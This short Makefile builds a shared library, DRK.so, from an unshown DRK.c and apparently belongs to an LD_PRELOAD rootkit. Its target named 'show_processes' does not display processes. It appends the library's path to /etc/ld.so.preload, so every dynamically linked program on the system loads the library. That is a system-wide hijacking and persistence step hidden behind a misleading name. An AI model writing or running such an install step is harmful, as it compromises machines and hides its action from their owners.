TARGET = DRK.so
CC = gcc
CFLAGS = -shared -fPIC -ldl
SRCS = DRK.c

all: $(TARGET)

$(TARGET):$(SRCS)

        $(CC) $(CFLAGS) -o $(TARGET) $(SRCS)

show_processes:
	echo "$(PWD)/$(TARGET)" >> /etc/ld.so.preload
